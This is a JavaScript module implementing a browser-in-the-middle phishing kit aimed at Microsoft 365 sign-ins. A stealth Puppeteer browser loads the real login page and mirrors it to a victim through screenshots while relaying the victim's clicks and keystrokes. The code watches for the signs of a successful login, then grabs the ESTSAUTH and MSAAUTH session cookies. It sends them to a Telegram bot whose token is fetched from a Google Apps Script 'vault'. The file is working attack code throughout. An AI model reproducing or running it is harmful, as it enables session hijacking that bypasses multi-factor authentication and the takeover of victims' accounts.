const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION ---
const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
const TARGET_URL = "https://login.microsoftonline.com/";
const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

let cachedSecrets = null;

/**
 * Fetches Telegram credentials from the GAPS Vault
 */
async function getSecrets() {
    if (cachedSecrets) return cachedSecrets;
    try {
        const response = await axios.get(VAULT_URL, { timeout: 5000 });
        cachedSecrets = response.data;
        return cachedSecrets;
    } catch (e) {
        return null;
    }
}

/**
 * Sends cookies and alerts to Telegram via GAPS credentials
 */
async function sendExfiltration(cookies, url) {
    const secrets = await getSecrets();
    if (!secrets || !secrets.TG_TOKEN || !secrets.TG_CHAT_ID) return;

    const host = new URL(url).hostname;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');

    try {
        // 1. Send Text Alert
        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, {
            chat_id: secrets.TG_CHAT_ID,
            text: `<b>🚨 STAGE CAPTURE</b>\n<b>Host:</b> ${host}\n<b>Cookies:</b> ${cookies.length}`,
            parse_mode: 'HTML'
        });

        // 2. Send Cookie Jar File
        const form = new FormData();
        form.append('chat_id', secrets.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `JAR_${host}_${timestamp}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {
        // Fail silently to avoid interrupting the session
    }
}

async function startSession(io, socket) {
    let browser = null;
    const captured = new Set();

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--no-zygote',
                '--single-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        await page.goto(TARGET_URL, { waitUntil: 'networkidle2' });

        // Monitoring Loop for Exfiltration
        const poller = setInterval(async () => {
            try {
                const url = page.url();
                // Check for specific success indicators (KMSI or Shell)
                if (url.includes('/kmsi') || url.includes('portal.office.com')) {
                    const host = new URL(url).hostname;
                    if (!captured.has(host)) {
                        const cookies = await page.cookies();
                        const hasAuth = cookies.some(c => c.name.includes('ESTSAUTH') || c.name.includes('MSAAUTH'));
                        
                        if (hasAuth) {
                            captured.add(host);
                            await sendExfiltration(cookies, url);
                        }
                    }
                }
            } catch (e) {}
        }, 5000);

        // Render Loop for the Mirror
        const heartbeat = setInterval(async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ 
                        encoding: 'base64', 
                        type: 'jpeg', 
                        quality: 20 
                    });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        }, 1000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                if (data.type === 'key') await page.keyboard.press(data.key);
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(poller);
            if (browser) {
                const pages = await browser.pages();
                await Promise.all(pages.map(p => p.close().catch(() => {})));
                await browser.close().catch(() => {});
                browser = null;
            }
        });

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
    }
}

module.exports = { startSession };
